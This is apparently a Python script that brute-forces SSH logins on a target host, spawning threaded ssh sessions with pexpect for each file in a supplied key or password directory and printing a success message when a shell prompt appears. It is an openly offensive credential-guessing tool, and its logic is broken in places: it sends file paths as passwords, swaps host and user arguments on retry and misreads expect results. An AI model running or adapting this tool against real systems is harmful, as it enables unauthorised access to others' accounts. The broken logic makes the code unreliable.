import optparse
import time
import threading
import pexpect
import os

maxConnections = 5 
connection_lock = threading.BoundedSemaphore(value=maxConnections) 
fails = 0
stop = False 
PROMPT=['# ','>>> ','>','$']

#function to connect using passwrd
def connect(host,user, password_file,release):
  global stop
  global fails
  
  try:
    
    
    #if u r connecting for the first time it will generate newsshkey.
    ssh_newkey = 'Are you sure you want to continue connecting'
    permission_denied= "Permission Denied"
    connection_closed="Connection closed by remote host"
    connStr = 'ssh ' + user + '@' + host
    #Create and control child application and pass login commands
    child = pexpect.spawn(connStr)
    #three types of output we defined over here that is timeout, a message indicating host used a new public key, and a prompt for a password
    ret = child.expect([pexpect.TIMEOUT,connStr,permission_denied, ssh_newkey, connection_closed,'[P|p]assword:','$','#'])
    #if connection timesout
    fails+=1
    if ret == 0:
      print('[-] Error Connecting')
    #Connecting using the new key 
    if ret ==2:
      print("[+] Are you sure you want to continue connecting")
      child.sendline('yes')
      connect(user,host,password_file,False)
    elif ret ==4:
      print("[-]Connection closed by remote host")
      
         
    elif ret > 4:
      print('[++] Success: '+ str(password_file))
      stop=True
    child.sendline(password_file)
    child.expect(PROMPT)
    return child
  finally:
    if release:
      connection_lock.release()
       
#created function to connect using passwrd user and host.
def main():
  global stop
  global fails
  #created parser for taking argument from the command line
  parser = optparse.OptionParser('usage prop -H <target host> -u <user> -d <key path>')
  #parser setup for host input
  parser.add_option('-H', dest='tgtHost', type='string', help='specify host')
  #parser setup for host input
  parser.add_option('-u', dest='user', type='string', help='specify user')
  #parser setup for directory of password file 
  parser.add_option('-d', dest='passwdDir', type='string', help='specify keys Directory')
  (options, args) = parser.parse_args()
  host = options.tgtHost
  passwdDir = options.passwdDir
  user = options.user
  if host == None or user == None or passwdDir == None:
    print(parser.usage)
    exit(0)
    #reading our password file in the password directory
  for files in os.listdir(passwdDir):
    #if it found the key file in passwd directory than it will print existing key found
    if stop:
      print("[**] Existing key found")
      exit(0)
      #set a limit for no of passwrd attempt
    if fails > 5:
      print('[-]Sorry: Key file not matches')
      exit(0)
      
    connection_lock.acquire()
    #printing all the passwrds files we were checking in the directory of file.
    all_files = os.path.join(passwdDir,files)
    print('[-]Testing keys: ' + str(all_files))
    t = threading.Thread(target=connect, args=(host, user, all_files, True))
    child = t.start()
    

if __name__ == '__main__':
  main()